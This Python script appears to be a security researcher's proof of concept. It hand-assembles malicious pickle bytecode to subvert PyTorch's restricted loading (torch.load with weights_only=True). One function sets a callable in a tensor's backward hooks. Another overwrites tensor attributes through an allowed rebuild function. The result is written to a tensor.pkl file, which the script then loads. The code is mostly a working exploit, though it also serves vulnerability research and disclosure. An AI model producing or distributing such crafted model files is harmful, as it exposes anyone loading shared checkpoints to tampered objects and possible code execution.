import io
import os
import pickletools

import torch
from pickleassem import PickleAssembler
from torch.serialization import _open_zipfile_writer


def save_malicious_pickle(payload):

    data = io.BytesIO()
    data.write(payload)
    data.seek(0)

    data_value = data.getvalue()
    with _open_zipfile_writer("tensor.pkl") as zip_file:
        zip_file.write_record("data.pkl", data_value, len(data_value))
        with open("data_0", "rb") as f:
            tdata = f.read()
            zip_file.write_record("data/0", tdata, len(tdata))


def create_generic_tensor(pa: PickleAssembler):
    # rebuild_tensor_v2 arguments
    pa.push_mark()

    # Arguments for persistent load (returns the (typed) storage)
    pa.push_mark()
    # Typename for persistent_load
    pa.push_binunicode("storage")
    # Data for persistent load
    # storage type
    pa.push_global("torch", "DoubleStorage")
    # key
    pa.push_binunicode("0")
    # location
    pa.push_binunicode("cpu")
    # numel (num elements)
    pa.push_binint1(1)
    pa.build_tuple()
    pa.push_binpersid()

    # storage_offset
    pa.push_binint1(0)

    # size
    pa.push_binint1(1)
    pa.build_tuple1()

    # Stride
    pa.push_binint1(1)
    pa.build_tuple1()

    # requires_grad
    pa.push_true()

    # backward_hooks (create empty Ordered Dict)
    pa.push_global("collections", "OrderedDict")
    pa.push_empty_tuple()
    pa.build_reduce()

    pa.build_tuple()

    pa.build_reduce()


def set_backward_hook():
    """We can set the backward hooks for a new tensor (it's just an argument
    to _rebuild_tensor_v2 which is expected to be an empty OrderedDict, but
    we can just set its items and there's no check)"""
    pa = PickleAssembler(proto=2)
    pa.push_global("torch", "_utils._rebuild_tensor_v2")

    # rebuild_tensor_v2 arguments
    pa.push_mark()

    # Arguments for persistent load
    pa.push_mark()
    # Typename for persistent_load
    pa.push_binunicode("storage")
    # Data for persistent load
    # storage type
    pa.push_global("torch", "DoubleStorage")
    # key
    pa.push_binunicode("0")
    # location
    pa.push_binunicode("cpu")
    # numel (num elements)
    pa.push_binint1(1)
    pa.build_tuple()
    pa.push_binpersid()

    # storage_offset
    pa.push_binint1(0)

    # size
    pa.push_binint1(1)
    pa.build_tuple1()

    # Stride
    pa.push_binint1(1)
    pa.build_tuple1()

    # requires_grad
    pa.push_true()

    # backward_hooks (create empty Ordered Dict)
    pa.push_global("collections", "OrderedDict")
    pa.push_empty_tuple()
    pa.build_reduce()

    # Set item in backward_hooks dict
    ####
    pa.push_binint1(0)
    pa.push_global("torch", "_utils._rebuild_tensor")
    pa.build_setitem()
    ####
    # build the tuple for reduce
    pa.build_tuple()

    # call rebuild_tensor_v2
    pa.build_reduce()
    payload = pa.assemble()

    save_malicious_pickle(payload)


def swap_tensor_attrs():
    """We can call __setstate__ on a Tensor object by calling the allowed
    _rebuild_from_type_v2 function in torch/_tensor.py and giving it the
    desired state as the last argument"""

    pa = PickleAssembler(proto=2)

    # In torch/_tensor.py
    pa.push_global("torch", "_tensor._rebuild_from_type_v2")
    pa.push_mark()

    # func
    pa.push_global("torch", "_utils._rebuild_tensor_v2")

    # new_type
    pa.push_global("torch", "Tensor")

    ## args (for _rebuild_tensor_v2)
    pa.push_mark()
    pa.push_mark()
    ### Typename for persistent_load
    pa.push_binunicode("storage")
    ### Data for persistent load
    ### storage type
    pa.push_global("torch", "DoubleStorage")
    ### key
    pa.push_binunicode("0")
    ### location
    pa.push_binunicode("cpu")
    ### numel (num elements)
    pa.push_binint1(1)
    ### Put everything in a tuple, will be the argument to persistent_load
    pa.build_tuple()
    pa.push_binpersid()

    ## storage_offset
    pa.push_binint1(0)

    ## size
    pa.push_binint1(1)
    pa.build_tuple1()

    ## stride
    pa.push_binint1(1)
    pa.build_tuple1()

    ## requires_grad
    pa.push_true()

    # backward_hooks (create empty Ordered Dict)
    pa.push_global("collections", "OrderedDict")
    pa.push_empty_tuple()
    pa.build_reduce()

    # Build the tuple for rebuild_tensor_v2 args
    pa.build_tuple()

    # state
    pa.push_empty_dict()
    pa.push_binunicode("xlogy")
    pa.push_binunicode("test")
    pa.build_setitem()

    # build the tuple for reduce
    pa.build_tuple()

    pa.build_reduce()
    payload = pa.assemble()

    save_malicious_pickle(payload)


if __name__ == "__main__":

    # set_backward_hook()
    swap_tensor_attrs()

    with open("tensor.pkl", "rb") as f:
        x = torch.load(f, weights_only=True)
        print(x.xlogy)
        # x.backward()

    # with open("tensor.pkl", "rb") as f:
    #     p = f.read()
    #     pickletools.dis(p)
